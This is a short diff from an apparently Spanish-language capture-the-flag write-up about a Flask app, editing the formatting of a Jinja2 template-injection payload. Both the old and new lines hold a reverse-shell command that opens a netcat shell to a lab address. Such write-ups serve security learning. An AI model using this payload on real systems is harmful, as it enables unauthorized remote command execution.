@@ -152,7 +152,7 @@ Ahora sí podemos ver, y al ver con Wappalyzer nos muestra que corre Flask. Lanz
 ¡Tenemos RCE! Ahora, probé una línea de shell reverso de la hoja de trucos de shell reverso de PentestMonkey. Esta fue mi carga útil final:
 
 ```python
-{% raw %}{% raw %}{% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f').read()}}{% endraw %}{% endraw %}{% endraw %}
+ {request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f').read()} 
 ```
 
 ## Acceso inicial
